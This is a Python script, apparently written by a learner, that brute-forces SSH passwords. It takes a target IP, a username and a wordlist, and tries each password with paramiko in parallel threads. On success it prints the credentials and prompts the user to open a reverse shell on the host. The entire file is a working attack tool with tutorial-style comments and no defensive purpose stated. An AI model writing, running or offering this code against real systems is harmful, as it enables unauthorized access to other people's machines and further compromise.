#paramiko allows to automate processes of connecting to our ssh client
import paramiko,sys,os,socket,termcolor #any task that is done in the internet we would need to use socket
# for faster checking ssh connection
import threading,time # this will allow us to analyze faster when using many passwords

stop_flag = 0


def ssh_connect(password, code=0):
  global stop_flag
  #initializing paramiko in order to make ssh connections. declare ssh client
  #This are two Standard lines when connecting ssh
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  
  #Starting to connect with ssh tot the ip usingh the port 22
  try:
    #in the command line would look like this
    # $ ssh username@ip_address 
    ssh.connect(host, port=22, username=username,password=password)
    stop_flag = 1
    print(termcolor.colored((f"👻 Succesful SSH connection using the password={password} with username={username}"),"green"))
    print("Now use this information to make a reverse shell to that IP with the user and password 👀")
  except :
    print(termcolor.colored((f"☠️ incorrect password={password} "),"red"))
  
  ssh.close()


if __name__ == '__main__':
  #This is where program starts 👻👻👻👻👻👻👻👻👻👻👻👻👻👻👻👻👻👻👻👻👻


  host = input("🐧IP address of the machine you want to BruteForce ssh: ")
  username = input("SSH Username: ")

  input_file = input("🔬Enter name of the file with passwords to try: ")

  #Checking if file exists
  if os.path.exists(input_file) == False:
    print(f"File with name {input_file} dosent exist 🫠")
    sys.exit(1)
  

  print(
    f'''
    🐧STARTING BRUTE FORCE🐧
    IP: {host}
    username: {username}

    cmd command:
    $ ssh {username}@{host}
    {username}@{host}'s password:
    '''
  )

  #opening passwords file
  with open(input_file, "r") as file:
    for inLinePassword in file.readlines():
      if stop_flag == 1:
        t.join()
        exit()
      password = inLinePassword.strip() #filtering password for unnecessary characters
      t = threading.Thread(target=ssh_connect, args=(password,)) # thread object in order to perform ssh_connect function using the password parameter

      t.start()
      time.sleep(0.5)
